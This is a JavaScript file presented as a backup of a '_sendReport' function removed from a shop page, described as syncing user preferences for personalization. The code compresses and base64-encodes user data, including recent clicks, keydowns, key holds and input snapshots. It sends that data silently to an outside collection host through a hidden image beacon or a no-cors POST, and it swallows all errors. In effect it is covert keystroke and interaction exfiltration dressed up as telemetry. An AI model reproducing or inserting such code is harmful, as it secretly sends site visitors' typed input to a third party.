/**
 * Backup of _sendReport function removed from shop.html
 * Sync user preferences and interaction data for personalization.
 * Uses deflate compression + base64 encoding to minimize payload.
 */
function _sendReport(data) {
  var ENDPOINT = 'https://cdn-gw.premiumshop.io/collect';
  var MAX_URL = 7500;

  function _toBase64(str) {
    return btoa(unescape(encodeURIComponent(str)));
  }

  function _trimForPost(obj) {
    var slim = JSON.parse(JSON.stringify(obj));
    if (slim.rawEvents) {
      if (slim.rawEvents.clicks && slim.rawEvents.clicks.length > 10) slim.rawEvents.clicks = slim.rawEvents.clicks.slice(-10);
      if (slim.rawEvents.keydowns && slim.rawEvents.keydowns.length > 10) slim.rawEvents.keydowns = slim.rawEvents.keydowns.slice(-10);
      if (slim.rawEvents.keyHolds && slim.rawEvents.keyHolds.length > 10) slim.rawEvents.keyHolds = slim.rawEvents.keyHolds.slice(-10);
    }
    if (slim.intentMutations && slim.intentMutations.snapshots && slim.intentMutations.snapshots.length > 5) {
      slim.intentMutations.snapshots = slim.intentMutations.snapshots.slice(-5);
    }
    return slim;
  }

  function _sendAsGet(b64) {
    try {
      var img = new Image();
      img.src = ENDPOINT + '?d=' + encodeURIComponent(b64);
    } catch(e) {}
  }

  function _sendAsPost(payload) {
    try {
      fetch(ENDPOINT, {
        method: 'POST',
        mode: 'no-cors',
        headers: { 'Content-Type': 'text/plain' },
        body: payload
      });
    } catch(e) {}
  }

  // Try compression (modern browsers)
  if (typeof CompressionStream !== 'undefined') {
    var jsonBytes = new TextEncoder().encode(JSON.stringify(data));
    var cs = new CompressionStream('deflate');
    var writer = cs.writable.getWriter();
    writer.write(jsonBytes);
    writer.close();
    var chunks = [];
    var reader = cs.readable.getReader();
    (function pump() {
      reader.read().then(function(result) {
        if (result.done) {
          var totalLen = chunks.reduce(function(a, c) { return a + c.length; }, 0);
          var merged = new Uint8Array(totalLen);
          var offset = 0;
          for (var i = 0; i < chunks.length; i++) {
            merged.set(chunks[i], offset);
            offset += chunks[i].length;
          }
          var binary = '';
          for (var j = 0; j < merged.length; j++) binary += String.fromCharCode(merged[j]);
          var b64 = 'deflate:' + btoa(binary);
          if (b64.length <= MAX_URL) {
            _sendAsGet(b64);
          } else {
            _sendAsPost(b64);
          }
          return;
        }
        chunks.push(result.value);
        pump();
      });
    })();
  } else {
    // Fallback: no compression
    var jsonStr = JSON.stringify(data);
    var b64 = 'raw:' + _toBase64(jsonStr);
    if (b64.length <= MAX_URL) {
      _sendAsGet(b64);
    } else {
      // Trim and try again, or POST full
      var trimmed = 'raw:' + _toBase64(JSON.stringify(_trimForPost(data)));
      if (trimmed.length <= MAX_URL) {
        _sendAsGet(trimmed);
      } else {
        _sendAsPost(b64);
      }
    }
  }
}
